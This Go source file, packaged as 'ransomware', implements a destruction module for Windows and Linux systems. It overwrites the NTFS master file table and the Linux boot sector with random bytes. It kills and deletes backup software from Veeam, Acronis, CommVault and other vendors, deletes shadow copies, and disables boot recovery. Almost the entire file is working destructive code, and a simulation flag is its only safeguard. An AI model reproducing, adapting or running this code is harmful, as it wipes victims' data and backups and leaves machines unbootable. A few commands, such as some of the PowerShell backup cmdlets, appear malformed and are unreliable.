package ransomware

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

type DestructionEngine struct {
	config *RansomwareConfig
}

func NewDestructionEngine(cfg *RansomwareConfig) *DestructionEngine {
	return &DestructionEngine{config: cfg}
}

func (de *DestructionEngine) DestroySystem() error {
	if de.config.Simulation {
		return nil
	}

	if runtime.GOOS != "windows" {
		return nil
	}

	if de.config.MFTDestruct {
		if err := de.scrambleMFT(); err != nil {
			return fmt.Errorf("mft: %w", err)
		}
	}

	if de.config.FirmwareSabotage {
		if err := de.sabotageUEFI(); err != nil {
			return fmt.Errorf("uefi: %w", err)
		}
	}

	if de.config.CloudBackupKill {
		if err := de.destroyCloudBackups(); err != nil {
			return fmt.Errorf("cloud backup: %w", err)
		}
	}

	return nil
}

func (de *DestructionEngine) scrambleMFT() error {
	cmd := exec.Command("cmd", "/c", "fsutil", "dirty", "query", "C:")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("no admin: %w", err)
	}

	raw, err := os.OpenFile(`\\.\C:`, os.O_RDWR, 0)
	if err != nil {
		return fmt.Errorf("open volume: %w", err)
	}
	defer raw.Close()

	mftOffset := int64(0x0C0000)
	corruptSize := int64(1024 * 1024)

	buf := make([]byte, 4096)
	for offset := mftOffset; offset < mftOffset+corruptSize; offset += 4096 {
		io.ReadFull(rand.Reader, buf)
		raw.WriteAt(buf, offset)
	}

	return nil
}

func (de *DestructionEngine) sabotageUEFI() error {
	cmd := exec.Command("powershell", "-Command",
		"Get-SecureBootUEFI -Name SetupMode")
	if err := cmd.Run(); err != nil {
		return nil
	}

	commands := []string{
		`bcdedit /set {default} bootstatuspolicy ignoreallfailures`,
		`bcdedit /set {default} recoveryenabled No`,
		`bcdedit /set {default} bootmenupolicy Legacy`,
	}

	for _, c := range commands {
		parts := strings.Split(c, " ")
		cmd := exec.Command(parts[0], parts[1:]...)
		cmd.Run()
	}

	return nil
}

func (de *DestructionEngine) destroyCloudBackups() error {
	backupAgents := []string{
		"VeeamBackupManager", "Veeam.Backup.Shell",
		"Veeam.EndPoint.Service",
		"AcronisAgent", "Acronis.Backup.Service",
		"CommVault", "CVServiceManager",
		"BackupExec", "BEService",
		"Arcserve", "CAARCserve",
		"DPM", "DPMRA",
	}

	for _, agent := range backupAgents {
		cmd := exec.Command("taskkill", "/F", "/IM", agent+".exe")
		cmd.Run()
	}

	configPaths := []string{
		`C:\ProgramData\Veeam\Backup`,
		`C:\ProgramData\Veeam\Endpoint`,
		`C:\Program Files\Veeam\Backup and Replication`,
		`C:\Program Files\Acronis`,
		`C:\Program Files\CommVault`,
	}

	for _, p := range configPaths {
		abs := p
		if _, err := os.Stat(abs); err == nil {
			os.RemoveAll(abs)
		}
	}

	scripts := []string{
		`Get-WBBackupTarget | Remove-WBBackupTarget`,
		`Get-Backup | Remove-Backup`,
		`Get-VeeamPoint | Remove-VeeamBackup`,
	}

	for _, s := range scripts {
		cmd := exec.Command("powershell", "-Command", s)
		cmd.Run()
	}

	return nil
}

func (de *DestructionEngine) WipeFreeSpace(drive string) error {
	tmpPath := filepath.Join(drive, fmt.Sprintf("$X404X_WIPE_%d", generateWipeID()))
	f, err := os.Create(tmpPath)
	if err != nil {
		return fmt.Errorf("create wipe file: %w", err)
	}

	buf := make([]byte, 1024*1024)
	for i := 0; i < 1024; i++ {
		io.ReadFull(rand.Reader, buf)
		if _, err := f.Write(buf); err != nil {
			f.Close()
			os.Remove(tmpPath)
			return err
		}
	}
	f.Close()
	os.Remove(tmpPath)
	return nil
}

func (de *DestructionEngine) CorruptBootloader() error {
	if runtime.GOOS != "linux" {
		return nil
	}

	mbr, err := os.OpenFile("/dev/sda", os.O_WRONLY, 0)
	if err != nil {
		mbr, err = os.OpenFile("/dev/nvme0n1", os.O_WRONLY, 0)
		if err != nil {
			return fmt.Errorf("open disk: %w", err)
		}
	}
	defer mbr.Close()

	buf := make([]byte, 512)
	io.ReadFull(rand.Reader, buf)
	if _, err := mbr.WriteAt(buf, 0); err != nil {
		return fmt.Errorf("write mbr: %w", err)
	}

	return nil
}

func (de *DestructionEngine) DeleteShadowCopies() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	cmd := exec.Command("vssadmin", "delete", "shadows", "/all", "/quiet")
	cmd.Run()

	cmd = exec.Command("wmic", "shadowcopy", "delete")
	cmd.Run()

	cmd = exec.Command("bcdedit", "/set", "{default}", "recoveryenabled", "No")
	cmd.Run()

	return nil
}

func generateWipeID() uint32 {
	b := make([]byte, 4)
	io.ReadFull(rand.Reader, b)
	return binary.BigEndian.Uint32(b)
}
